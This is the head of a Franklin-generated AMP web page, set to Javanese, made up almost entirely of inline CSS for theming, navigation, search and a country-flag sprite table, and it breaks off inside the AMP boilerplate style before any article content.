<!doctypehtml><html prefix="og: https://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"amp lang=jw><script async src=https://cdn.ampproject.org/v0.js></script><meta charset=utf-8><meta content=width=device-width,minimum-scale=1,initial-scale=1 name=viewport><style amp-custom>.hljs{display:block;font-size:14px;line-height:1.45em;overflow-x:auto;padding:.5em;color:var(--text-color);background:var(--block-background)}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:var(--text-color);font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:var(--text-color);font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}:root{--block-background: var(--accent2);--small: 14px;--normal: 19px;--text-color: hsv(0, 0%, 20%)}.franklin-content .row{display:block}.franklin-content .left{float:left;margin-right:15px}.franklin-content .right{float:right}.franklin-content .container img{width:auto;padding-left:0;border-radius:10px}.franklin-content .footnote{position:relative;top:-.5em;font-size:70%}.franklin-toc li{margin:.6rem 0}.franklin-content{position:relative;padding-left:12.5%;padding-right:12.5%;line-height:1.35em}@media (min-width: 940px){.franklin-content{width:705px;margin-left:auto;margin-right:auto}}@media (max-width: 480px){.franklin-content{padding-left:6%;padding-right:6%}}.franklin-content h1{font-size:24px}.franklin-content h2{font-size:22px}.franklin-content h3{font-size:20px}.franklin-content h1,h2,h3,h4,h5,h6{text-align:left}.franklin-content h1{padding-bottom:.5em;border-bottom:3px double lightgrey;margin-top:1.5em;margin-bottom:1em}.franklin-content h2{padding-bottom:.3em;border-bottom:1px solid lightgrey;margin-top:2em;margin-bottom:1em}.franklin-content h1 a{color:inherit}.franklin-content h1 a:hover{text-decoration:none}.franklin-content h2 a{color:inherit}.franklin-content h2 a:hover{text-decoration:none}.franklin-content h3 a{color:inherit}.franklin-content h3 a:hover{text-decoration:none}.franklin-content h4 a{color:inherit}.franklin-content h4 a:hover{text-decoration:none}.franklin-content h5 a{color:inherit}.franklin-content h5 a:hover{text-decoration:none}.franklin-content h6 a{color:inherit}.franklin-content h6 a:hover{text-decoration:none}.franklin-content table{margin-left:auto;margin-right:auto;border-collapse:collapse;text-align:center}.franklin-content table *{line-height:.75rem}.franklin-toc ol ol{list-style-type:lower-alpha}.franklin-content th,td{font-size:var(--small);padding:10px;border:1px solid black}.franklin-content blockquote{background:var(--block-background);border-left:7px solid #a8a8a8;margin:1.5em 10px;padding:.5em 10px;font-style:italic}.franklin-content blockquote p{display:inline}.franklin-content li p{margin:10px 0}.franklin-content a{color:var(--alt2);text-decoration:none}.franklin-content a:hover{text-decoration:underline}.franklin-content .eqref a{color:green}.franklin-content .bibref a{color:green}.franklin-content sup{font-size:70%;vertical-align:super;line-height:0}.franklin-content sup a.fnref,.franklin-content td.fndef-backref a{overflow:visible;display:initial;padding-bottom:.3rem;padding-top:.2rem}.franklin-content table.fndef{margin:0 0 10px}.franklin-content .fndef tr,td{padding:0;border:0;text-align:left}.franklin-content .fndef tr{border-left:2px solid lightgray}.franklin-content .fndef td.fndef-backref{vertical-align:top;font-size:70%;padding-left:5px}.franklin-content .fndef td.fndef-content{font-size:80%;padding-left:10px;width:100%}.franklin-content img{width:70%;text-align:center;padding-left:10%}.franklin-content .img-small img{width:50%;text-align:center;padding-left:20%}body{counter-reset:eqnum}.katex{font-size:1em}.katex-display .katex{display:inline-block;white-space:normal}.katex-display:after{counter-increment:eqnum;content:"(" counter(eqnum) ")";position:relative;float:right;padding-right:5px}code{background-color:var(--block-background);padding:.1em .2em;border-radius:2px;font-size:var(--small);overflow:auto}code.plaintext{display:block}.scrollbox{width:10em;height:10em;overflow:auto;visibility:hidden}.scrollbox-content,.scrollbox:hover,.scrollbox:focus{visibility:visible}.scrollbox_delayed{transition:visibility .2s}.scrollbox_delayed:hover{transition:visibility 0s .2s}.hljs{font-size:var(--small);line-height:1.35em;border-radius:10px}.hljs-meta,.hljs-metas,.hljs-metap{font-weight:bold}.hljs-meta{color:#19b333}.hljs-metas{color:red}.hljs-metap{color:#3383e7}.franklin-content .colbox-blue{background-color:#eef3f5;padding:5px 10px;margin-left:5px;margin-top:5px;margin-bottom:5px;border-radius:0 10px 10px 0;border-left:5px solid #4c9cf1}body.light{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--alt4: #ffbebe;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: light){body{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body.dark{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: dark){body{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body{background:var(--background-color);font-style:var(--accent);font-family:Helvetica;padding:0 .5rem;line-height:2rem;color:var(--accent3);max-width:1280px;min-height:720px;margin:auto;min-width:320px}a{color:var(--accent)}a:visited{color:var(--accent2)}.author__place .author__bio{font-size:1rem}.franklin-content blockquote{border-left-color:var(--accent)}.franklin-content{color:var(--foreground-color)}.franklin-content #title a,.franklin-content .header-anchor{padding:.5rem;line-height:100%}.franklin-content a{outline-style:outset;outline-width:1px;padding:0 .1rem;margin:0 .1rem;outline-color:var(--alt2)}.franklin-content img{width:auto;text-align:center;padding:0}body>div>h1{text-align:center;color:var(--accent2)}body>div #title,body>div #page-description{text-align:center}.page__footer{margin-top:1rem;padding-top:1rem}.franklin-content .intro{font-size:1.2rem;text-align:left}.franklin-content .intro ul{list-style-type:none;font-size:1.1rem;font-style:italic}.franklin-content .intro a{font-variant:small-caps;padding-bottom:.2rem;font-size:1.4rem;font-style:normal}.franklin-content .intro .icon{padding:0 .2rem;font-size:1rem}.franklin-content .active-projects ul h4{font-size:1.5rem;font-variant:small-caps;font-style:normal;margin:.2rem}.franklin-content h3{font-size:.9rem}.posts_list h3{text-align:center}.svg-inline--fa.icon{width:1rem}.masthead__menu{height:4rem;line-height:4rem;padding:10px 0;position:relative}.site-title{float:left;font-weight:bold;width:15rem;font-size:1.5rem;text-decoration:none;color:var(--accent)}.site-title:visited{color:var(--accent)}#site-nav{float:right;font-size:1.5rem;font-family:Courier New;font-weight:bold;position:absolute;right:0}#site-nav .horiz ul{list-style-type:none;line-height:4rem;height:4rem;margin:0}#site-nav .horiz ul>li{padding:0 .5rem;box-shadow:.25rem -.025rem .05rem var(--alt)}#site-nav .horiz ul>li{float:left;border-top:0;border-bottom:0;border-left:0;border-radius:50% 25% 25% 50%}#site-nav ul>li>a,#site-nav ul>li>button{color:var(--alt);display:inline-block}#site-nav .menu-icons{position:relative;padding:0 .2rem}#site-nav{display:block;width:auto;height:auto}.masthead__inner-wrap{display:block;width:100%;padding:10px 0;height:inherit}.author__avatar>img{width:4em;height:4em;border-radius:50%;object-fit:cover;border-width:.1rem;border-color:var(--accent3);border-style:solid;box-shadow:.1rem .06rem var(--accent3),-.05rem -.025rem .2rem var(--accent3)}#site-nav a:link{text-decoration:none}#site-nav .vert,#site-nav .ham{display:none}.author__avatar{object-fit:contain;float:left}.author__name{display:none}.author__place{font-size:.65em}.author__wrap>ul{float:left;height:inherit;margin:0;padding:0 10px}.author__wrap>ul>li{position:relative;float:left;list-style-type:none;font-size:1rem;padding:0 .2rem;text-align:center}.page__footer ul>li{list-style-type:none}ul>li.author__urls{font-size:2rem}ul>li.author__urls a:visited{color:var(--accent)}ul>li.author__urls a:hover{filter:drop-shadow(.1rem .1rem 0 var(--accent2)) brightness(1.5);filter:brightness(1.5);transition-property:-moz-filter,-ms-filter,-o-filter,-webkit-filter,filter;transition-duration:.2s}ul>li.author__place a{color:var(--accent3);text-decoration:none;text-shadow:0 0 .01rem var(--alt2)}.author__wrap .author__avatar{float:left}.langs-dropdown-wrapper{cursor:pointer}.langs-dropdown-content{display:none;text-align:left}.langs-dropdown-content.show{display:block}.langs-dropdown-content a{display:block}.menu-lang-btn:before{border-radius:25% 25% 25% 50%}@media (max-width: 680px){.lang-link{height:3rem}}.lang-link .flag-icon,.lang-link .flag{position:absolute;left:1rem;margin-top:.65rem}#site-nav .langs-dropdown-menu{left:1.5rem;position:relative;top:1rem}#site-nav .langs-dropdown-menu .lang-list{font-size:1rem;line-height:2rem;overflow-x:hidden;height:20rem;position:absolute;overflow-y:scroll;right:1rem;scrollbar-width:thin;border:solid;border-radius:25%;border-width:0 0 0 .25rem;transition:height;padding-left:3rem}#site-nav .langs-dropdown-menu .lang-link:hover{color:var(--foreground-color)}.lang-list{background-color:var(--background-color)}#site-nav ul>li>button{background:inherit;border:inherit;font-size:inherit;font-family:inherit;font-weight:inherit;padding:inherit;margin:inherit;list-style-type:inherit;line-height:inherit;height:inherit}.page-foot{font-size:.7em;line-height:1.25em;text-align:right;display:inline-block;width:100%}.franklin-content{padding:0 0 2rem;z-index:0}.franklin-content,.tag-content{padding-top:1rem}.author__bio li{list-style:none}.author__bio li p{margin:0;padding:0}#tag-name{font-size:1.5rem;padding:.5rem;font-weight:bold;font-variant:small-caps}#tag_title{font-variant:small-caps}#tag_title .wrap{text-align:left}#tag_title>.wrap>*{display:inline-block;text-align:left}#tag_cloud{font-weight:bold}.posts_list.franklin-content>ul{list-style-type:"> "}.posts_list.franklin-content>.title{font-variant:small-caps}.posts_list.franklin-content>.title>h2{font-size:1rem;font-style:italic}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title>a>h1{display:inline}.posts_list.franklin-content>ul>li{line-height:1.2rem;padding:.1rem}.posts_list.franklin-content>ul>li>p{padding:.1rem;margin:.1rem}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title{text-align:center;display:block;margin:1rem}.page__footer-links>ul>li>a{padding:.2rem;margin:.2rem}#tag_cloud>a{padding:.2rem;font-variant:small-caps;vertical-align:middle;margin:.3rem;display:inline-block;text-decoration:none;text-shadow:0 0 5rem white}#tag_cloud .icon{font-size:1rem;vertical-align:middle;margin-right:.2rem;margin-left:.2rem}#tag_cloud_wrapper{display:inline-block;width:100%;text-align:center}#post-tags-list{font-variant:small-caps;font-weight:bold}.media{font-size:1.5rem;line-height:2rem}#library .book-author{color:var(--accent2);font-size:.9rem;display:inline}.shows_list h3{font-size:1.5rem}a.imdb{padding:0 .5rem}#searchResults ul li{margin-bottom:1rem}.lunrSearchForm{margin-right:-.4rem;font-size:0;overflow:hidden}.lunrSearchForm .search-input{background:var(--background-color);color:var(--alt);border-width:.2rem;border:none;outline:none;border-radius:50% 25% 25% 50%;line-height:1.75rem;padding:.5rem 0 .5rem 2.25rem;width:7rem;position:relative;top:.5rem;font-family:"Courier New";font-weight:bold;font-size:1.5rem}.lunrSearchForm .search-input:focus{background:var(--block-background)}.lunrSearchForm .search-button{color:var(--alt);background:none;border:none;font-size:1.5rem;padding:.2rem .2rem .2rem 0;position:absolute;top:1rem;left:.75rem;z-index:1;cursor:pointer}.lunrSearchForm .search-button:focus{color:var(--accent)}@media (min-width: 680px) and (max-width: 1300px){.lunrSearchForm .search-input{font-size:1rem;padding-left:2.75rem;width:4.5rem;border-radius:50% 100% 100% 50%}}@media (max-width: 680px){.lunrSearchForm{display:block;width:28rem}.lunrSearch{position:absolute;top:-4rem;display:block;left:0;width:calc(2rem + 90%)}.lunrSearch .search-input{width:26rem}}@media (max-width: 480px){.lunrSearchForm .search-input{width:18rem;left:-4rem}}.result-title a{text-decoration:none}.result-title a:hover{text-decoration:underline}.result-preview{color:gray}.resultCount{color:gray}.result-query{font-weight:bold}.lunrSearchForm{margin-top:1em}footer>*{float:left}footer a{text-decoration:underline dotted}footer ul.author__wrap>li{float:left;padding:0 .2rem}footer ul.author__wrap>li a{line-height:2rem;height:inherit;display:block}footer ul.author__wrap{float:right;margin:0}footer .page__footer-copyright{margin:0}footer .page__footer-links{margin:0 .2rem 0 .4rem}footer .page__footer-links ul{display:inline;margin:0 .4rem 0 0;padding:0}footer .page__footer-links li{display:inline}@media (min-width: 680px){#tag-name,.tag-desc{text-align:left}}@media (min-width: 680px) and (max-width: 1300px){body{max-width:640px;min-height:320px}#site-nav{position:relative;z-index:1}#site-nav .ham:hover{cursor:pointer}#site-nav .ham{outline:none}#site-nav .ham,#site-nav .ham-icon{display:block;height:3rem;line-height:3rem;position:absolute;right:0;top:0;text-align:right;background:transparent;border:none;font-size:3rem;color:var(--accent)}#site-nav .horiz{display:none}#site-nav .vert{display:block;float:none;position:absolute;right:0;top:3rem;width:9rem;padding-left:1rem;max-height:0rem;overflow:hidden;filter:blur(1rem);transition:max-height .33s ease-in,filter .33s ease-in}#site-nav .vert ul{margin:0;padding:10px 0}#site-nav .vert ul>li{width:100%;text-align:center;border-radius:25% 50% 50% 25%;adding:.5rem 1rem;box-shadow:-.25rem 0 .05rem var(--alt)}}@media (max-width: 680px){.masthead,.masthead__inner-wrap,.masthead__menu{display:block}.site-title{float:none;width:100%;display:block;text-align:center}.author__wrap{float:none;display:block;width:100%;height:4.4rem;text-align:center}.author__wrap ul{width:auto;float:none;padding:0;display:inline-block}#tag-name,.tag-desc{text-align:center}#site-nav{float:none;padding:10px 0;position:relative;top:4rem}#site-nav ul li{float:none}.horiz{text-align:center}#site-nav ul{display:inline-block;padding:0}.masthead{height:14rem}.page__footer{width:100%;display:block}.page__footer{text-align:center}footer{display:inline-block;text-align:center}footer>*{display:inline-block;float:none}footer ul.author__wrap{float:none}footer .author__urls.social-icons{font-size:1rem}.page-foot .copyright{display:inline-block}}@media (max-width: 480px){.masthead{height:30rem}#site-nav{top:5rem}#site-nav .horiz ul{width:100%}#site-nav .horiz ul>li{width:calc(100% - 2rem);float:none}}@media (min-width: 480px) and (max-width: 680px){.masthead{height:20rem}}@media (max-width: 680px){body{overflow-x:hidden}#site-nav{z-index:1}#site-nav .horiz ul>li{float:none;top:-4rem;position:relative;margin-top:1rem;margin-bottom:0}footer ul.author__wrap{margin-top:1rem;text-align:center;margin-left:0;padding-left:0}footer ul.author__wrap>li{float:none;display:inline-block}.page__footer{margin-top:3.5rem}}.site-title{-webkit-backface-visibility:hidden;backface-visibility:hidden;font-size:1.5rem;font-family:"VT323",monospace,sans-serif;color:var(--accent2);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.site-title:after{content:"â€‹";position:relative;padding-right:.5em;border-right:.5em solid var(--accent);white-space:nowrap;-webkit-animation:chars 5.52s linear 1s forwards,cursor 1s 3;animation:chars 5.52s linear 1s forwards,cursor 1s 3}.hvr-buzz-out{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px #0000}.hvr-buzz-out:hover,.hvr-buzz-out:focus,.hvr-buzz-out:active{-webkit-animation-name:hvr-buzz-out;animation-name:hvr-buzz-out;-webkit-animation-duration:.75s;animation-duration:.75s;-webkit-animation-timing-function:linear;animation-timing-function:linear;-webkit-animation-iteration-count:1;animation-iteration-count:1}.franklin-content a{display:inline-block;vertical-align:middle;text-decoration:none;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative;overflow:hidden}.franklin-content a:before{content:"";position:absolute;z-index:-1;left:51%;right:51%;bottom:0;background:var(--accent);height:4px;-webkit-transition-property:left,right;transition-property:left,right;-webkit-transition-duration:.3s;transition-duration:.3s;-webkit-transition-timing-function:ease-out;transition-timing-function:ease-out}.franklin-content a:hover:before,.franklin-content a:focus:before,.franklin-content a:active:before{left:0;right:0}.hvr-outline-in{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative}.horiz .hvr-outline-in:before{border-radius:50% 25% 25% 50%;right:-.25rem}.vert .hvr-outline-in:before{border-radius:25% 50% 50% 25%;left:-.25rem}.hvr-outline-in:before{pointer-events:none;content:"";position:absolute;border:var(--alt) solid .25rem;top:0;bottom:0;left:0;opacity:0;-webkit-transition-duration:.2s;transition-duration:.2s;-webkit-transition-property:top,right,bottom,left;transition-property:top,right,bottom,left}.horiz .hvr-outline-in:hover:before,.horiz .hvr-outline-in:focus:before,.horiz .hvr-outline-in:active:before{top:-.5rem;right:-.5rem;bottom:-.5rem;left:0;opacity:1}.vert .hvr-outline-in:hover:before,.vert .hvr-outline-in:focus:before,.vert .hvr-outline-in:active:before{top:-.5rem;right:0;bottom:-.5rem;left:-.5rem;opacity:1}#site-nav .vert:before{background-color:var(--background-color);filter:blur(.25rem);content:"";height:100%;width:100%;position:absolute}.author__avatar{background-color:transparent;perspective:1000px}.masthead__menu ul li.author__avatar img{transition:transform .8s;transform-style:preserve-3d}.masthead__menu li.author__avatar:hover img{transform:rotateY(180deg);cursor:pointer}body.light .hljs{display:block;overflow-x:auto;padding:.5em;color:#000;background:#f8f8ff}body.light .hljs-comment,body.light .hljs-quote{color:#408080;font-style:italic}body.light .hljs-keyword,body.light .hljs-literal,body.light .hljs-selector-tag,body.light .hljs-subst{color:#954121}body.light .hljs-number{color:#40a070}body.light .hljs-doctag,body.light .hljs-string{color:#219161}body.light .hljs-section,body.light .hljs-selector-class,body.light .hljs-selector-id,body.light .hljs-type{color:#19469d}body.light .hljs-params{color:#00f}body.light .hljs-title{color:#458;font-weight:700}body.light .hljs-attribute,body.light .hljs-name,body.light .hljs-tag{color:navy;font-weight:400}body.light .hljs-template-variable,body.light .hljs-variable{color:teal}body.light .hljs-link,body.light .hljs-regexp{color:#b68}body.light .hljs-bullet,body.light .hljs-symbol{color:#990073}body.light .hljs-built_in,body.light .hljs-builtin-name{color:#0086b3}body.light .hljs-meta{color:#999;font-weight:700}body.light .hljs-deletion{background:#fdd}body.light .hljs-addition{background:#dfd}body.light .hljs-emphasis{font-style:italic}body.light .hljs-strong{font-weight:700}.flag{display:inline-block;position:relative;width:16px;height:11px;background:url(/assets/flags.png) no-repeat}.flag.flag-gu{background-position:-96px -55px}.flag.flag-mn{background-position:-208px -88px}.flag.flag-va{background-position:-48px -154px}.flag.flag-tibet{background-position:-32px -143px}.flag.flag-fo{background-position:-64px -44px}.flag.flag-th{background-position:-16px -143px}.flag.flag-tr{background-position:-144px -143px}.flag.flag-tl{background-position:-80px -143px}.flag.flag-kz{background-position:-144px -77px}.flag.flag-zm{background-position:-16px -165px}.flag.flag-uz{background-position:-32px -154px}.flag.flag-dk{background-position:-64px -33px}.flag.flag-scotland{background-position:-176px -121px}.flag.flag-gi{background-position:-224px -44px}.flag.flag-gy{background-position:-128px -55px}.flag.flag-bj{background-position:-112px -11px}.flag.flag-fr{background-position:-80px -44px}.flag.flag-mo{background-position:-224px -88px}.flag.flag-ir{background-position:-112px -66px}.flag.flag-io{background-position:-80px -66px}.flag.flag-tm{background-position:-96px -143px}.flag.flag-ch{background-position:-96px -22px}.flag.flag-mt{background-position:-32px -99px}.flag.flag-nl{background-position:-240px -99px}.flag.flag-gp{background-position:-16px -55px}.flag.flag-im{background-position:-48px -66px}.flag.flag-tv{background-position:-176px -143px}.flag.flag-mu{background-position:-48px -99px}.flag.flag-pe{background-position:-96px -110px}.flag.flag-vi{background-position:-112px -154px}.flag.flag-hn{background-position:-176px -55px}.flag.flag-ss{background-position:-128px -132px}.flag.flag-ae{background-position:-16px 0}.flag.flag-td{background-position:-240px -132px}.flag.flag-pw{background-position:0 -121px}.flag.flag-nu{background-position:-32px -110px}.flag.flag-bt{background-position:-208px -11px}.flag.flag-ms{background-position:-16px -99px}.flag.flag-cv{background-position:-240px -22px}.flag.flag-es{background-position:-224px -33px}.flag.flag-mh{background-position:-144px -88px}.flag.flag-la{background-position:-160px -77px}.flag.flag-vn{background-position:-128px -154px}.flag.flag-py{background-position:-16px -121px}.flag.flag-br{background-position:-176px -11px}.flag.flag-ye{background-position:-224px -154px}.flag.flag-ie{background-position:0 -66px}.flag.flag-gh{background-position:-208px -44px}.flag.flag-cg{background-position:-80px -22px}.flag.flag-cu{background-position:-224px -22px}.flag.flag-hu{background-position:-224px -55px}.flag.flag-sg{background-position:-224px -121px}.flag.flag-at{background-position:-176px 0}.flag.flag-lk{background-position:-224px -77px}.flag.flag-vu{background-position:-144px -154px}.flag.flag-bo{background-position:-160px -11px}.flag.flag-jo{background-position:-208px -66px}.flag.flag-er{background-position:-208px -33px}.flag.flag-za{background-position:-256px -154px}.flag.flag-rs{background-position:-80px -121px}.flag.flag-nr{background-position:-16px -110px}.flag.flag-ls{background-position:-256px -77px}.flag.flag-jm{background-position:-192px -66px}.flag.flag-tz{background-position:-208px -143px}.flag.flag-ki{background-position:-16px -77px}.flag.flag-sj{background-position:0 -132px}.flag.flag-cz{background-position:-16px -33px}.flag.flag-pg{background-position:-128px -110px}.flag.flag-lv{background-position:-32px -88px}.flag.flag-do{background-position:-96px -33px}.flag.flag-lu{background-position:-16px -88px}.flag.flag-no{background-position:-256px -99px}.flag.flag-kw{background-position:-112px -77px}.flag.flag-mx{background-position:-96px -99px}.flag.flag-yt{background-position:-240px -154px}.flag.flag-ly{background-position:-48px -88px}.flag.flag-cy{background-position:0 -33px}.flag.flag-ph{background-position:-144px -110px}.flag.flag-my{background-position:-112px -99px}.flag.flag-sm{background-position:-48px -132px}.flag.flag-et{background-position:-240px -33px}.flag.flag-ru{background-position:-96px -121px}.flag.flag-tj{background-position:-48px -143px}.flag.flag-ai{background-position:-64px 0}.flag.flag-pl{background-position:-176px -110px}.flag.flag-kp{background-position:-64px -77px}.flag.flag-uy{background-position:-16px -154px}.flag.flag-gb{background-position:-112px -44px}.flag.flag-gs{background-position:-64px -55px}.flag.flag-kurdistan{background-position:-96px -77px}.flag.flag-rw{background-position:-112px -121px}.flag.flag-ec{background-position:-128px -33px}.flag.flag-mm{background-position:-192px -88px}.flag.flag-pa{background-position:-80px -110px}.flag.flag-wales{background-position:-160px -154px}.flag.flag-kg{background-position:-256px -66px}.flag.flag-ve{background-position:-80px -154px}.flag.flag-tk{background-position:-64px -143px}.flag.flag-ca{background-position:-16px -22px}.flag.flag-is{background-position:-128px -66px}.flag.flag-ke{background-position:-240px -66px}.flag.flag-ro{background-position:-64px -121px}.flag.flag-gq{background-position:-32px -55px}.flag.flag-pt{background-position:-256px -110px}.flag.flag-tf{background-position:-256px -132px}.flag.flag-ad{background-position:0 0}.flag.flag-sk{background-position:-16px -132px}.flag.flag-pm{background-position:-192px -110px}.flag.flag-om{background-position:-64px -110px}.flag.flag-an{background-position:-112px 0}.flag.flag-ws{background-position:-192px -154px}.flag.flag-sh{background-position:-240px -121px}.flag.flag-mp{background-position:-240px -88px}.flag.flag-gt{background-position:-80px -55px}.flag.flag-cf{background-position:-64px -22px}.flag.flag-zanzibar{background-position:0 -165px}.flag.flag-mw{background-position:-80px -99px}.flag.flag-catalonia{background-position:-32px -22px}.flag.flag-ug{background-position:-240px -143px}.flag.flag-je{background-position:-176px -66px}.flag.flag-km{background-position:-32px -77px}.flag.flag-in{background-position:-64px -66px}.flag.flag-bf{background-position:-48px -11px}.flag.flag-mc{background-position:-80px -88px}.flag.flag-sy{background-position:-192px -132px}.flag.flag-sn{background-position:-64px -132px}.flag.flag-kr{background-position:-80px -77px}.flag.flag-eu{background-position:-256px -33px}.flag.flag-bn{background-position:-144px -11px}.flag.flag-st{background-position:-144px -132px}.flag.flag-england{background-position:-192px -33px}.flag.flag-lc{background-position:-192px -77px}.flag.flag-dm{background-position:-80px -33px}.flag.flag-be{background-position:-32px -11px}.flag.flag-ni{background-position:-224px -99px}.flag.flag-ua{background-position:-224px -143px}.flag.flag-mz{background-position:-128px -99px}.flag.flag-pf{background-position:-112px -110px}.flag.flag-tn{background-position:-112px -143px}.flag.flag-ee{background-position:-144px -33px}.flag.flag-xk{background-position:-208px -154px}.flag.flag-sx{background-position:-176px -132px}.flag.flag-sd{background-position:-192px -121px}.flag.flag-gd{background-position:-128px -44px}.flag.flag-ci{background-position:-112px -22px}.flag.flag-sz{background-position:-208px -132px}.flag.flag-cl{background-position:-144px -22px}.flag.flag-fi{background-position:0 -44px}.flag.flag-ga{background-position:-96px -44px}.flag.flag-jp{background-position:-224px -66px}.flag.flag-de{background-position:-32px -33px}.flag.flag-np{background-position:0 -110px}.flag.flag-re{background-position:-48px -121px}.flag.flag-bg{background-position:-64px -11px}.flag.flag-sc{background-position:-160px -121px}.flag.flag-ng{background-position:-208px -99px}.flag.flag-qa{background-position:-32px -121px}.flag.flag-mk{background-position:-160px -88px}.flag.flag-aw{background-position:-208px 0}.flag.flag-kn{background-position:-48px -77px}.flag.flag-al{background-position:-80px 0}.flag.flag-bw{background-position:-240px -11px}.flag.flag-um{background-position:-256px -143px}.flag.flag-ky{background-position:-128px -77px}.flag.flag-tt{background-position:-160px -143px}.flag.flag-so{background-position:-80px -132px}.flag.flag-lt{background-position:0 -88px}.flag.flag-by{background-position:-256px -11px}.flag.flag-bb{background-position:0 -11px}.flag.flag-us{background-position:0 -154px}.flag.flag-md{background-position:-96px -88px}.flag.flag-ag{background-position:-48px 0}.flag.flag-hm{background-position:-160px -55px}.flag.flag-as{background-position:-160px 0}.flag.flag-eg{background-position:-160px -33px}.flag.flag-sv{background-position:-160px -132px}.flag.flag-sl{background-position:-32px -132px}.flag.flag-fk{background-position:-32px -44px}.flag.flag-am{background-position:-96px 0}.flag.flag-ck{background-position:-128px -22px}.flag.flag-tw{background-position:-192px -143px}.flag.flag-kh{background-position:0 -77px}.flag.flag-to{background-position:-128px -143px}.flag.flag-se{background-position:-208px -121px}.flag.flag-cd{background-position:-48px -22px}.flag.flag-pn{background-position:-208px -110px}.flag.flag-gr{background-position:-48px -55px}.flag.flag-id{background-position:-256px -55px}.flag.flag-vc{background-position:-64px -154px}.flag.flag-somaliland{background-position:-96px -132px}.flag.flag-bi{background-position:-96px -11px}.flag.flag-pk{background-position:-160px -110px}.flag.flag-pr{background-position:-224px -110px}.flag.flag-bd{background-position:-16px -11px}.flag.flag-co{background-position:-192px -22px}.flag.flag-fm{background-position:-48px -44px}.flag.flag-bm{background-position:-128px -11px}.flag.flag-ar{background-position:-144px 0}.flag.flag-bv{background-position:-224px -11px}.flag.flag-sb{background-position:-144px -121px}.flag.flag-mq{background-position:-256px -88px}.flag.flag-eh{background-position:-176px -33px}.flag.flag-bh{background-position:-80px -11px}.flag.flag-it{background-position:-144px -66px}.flag.flag-hr{background-position:-192px -55px}.flag.flag-sa{background-position:-128px -121px}.flag.flag-mv{background-position:-64px -99px}.flag.flag-mg{background-position:-128px -88px}.flag.flag-dz{background-position:-112px -33px}.flag.flag-gg{background-position:-192px -44px}.flag.flag-gm{background-position:-256px -44px}.flag.flag-af{background-position:-32px 0}.flag.flag-li{background-position:-208px -77px}.flag.flag-sr{background-position:-112px -132px}.flag.flag-vg{background-position:-96px -154px}.flag.flag-cr{background-position:-208px -22px}.flag.flag-tc{background-position:-224px -132px}.flag.flag-ao{background-position:-128px 0}.flag.flag-ma{background-position:-64px -88px}.flag.flag-mr{background-position:0 -99px}.flag.flag-gn{background-position:0 -55px}.flag.flag-ne{background-position:-176px -99px}.flag.flag-nf{background-position:-192px -99px}.flag.flag-wf{background-position:-176px -154px}.flag.flag-hk{background-position:-144px -55px}.flag.flag-gf{background-position:-160px -44px}.flag.flag-ps{background-position:-240px -110px}.flag.flag-ic{background-position:-240px -55px}.flag.flag-cw{background-position:-256px -22px}.flag.flag-ml{background-position:-176px -88px}.flag.flag-ax{background-position:-224px 0}.flag.flag-gl{background-position:-240px -44px}.flag.flag-dj{background-position:-48px -33px}.flag.flag-cn{background-position:-176px -22px}.flag.flag-ht{background-position:-208px -55px}.flag.flag-lr{background-position:-240px -77px}.flag.flag-tg{background-position:0 -143px}.flag.flag-ba{background-position:-256px 0}.flag.flag-ge{background-position:-144px -44px}.flag.flag-bz{background-position:0 -22px}.flag.flag-au{background-position:-192px 0}.flag.flag-iq{background-position:-96px -66px}.flag.flag-cm{background-position:-160px -22px}.flag.flag-gw{background-position:-112px -55px}.flag.flag-az{background-position:-240px 0}.flag.flag-na{background-position:-144px -99px}.flag.flag-fj{background-position:-16px -44px}.flag.flag-zw{background-position:-32px -165px}.flag.flag-bs{background-position:-192px -11px}.flag.flag-il{background-position:-16px -66px}.flag.flag-nz{background-position:-48px -110px}.flag.flag-me{background-position:-112px -88px}.flag.flag-si{background-position:-256px -121px}.flag.flag-nc{background-position:-160px -99px}.flag.flag-lb{background-position:-176px -77px}</style><style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal 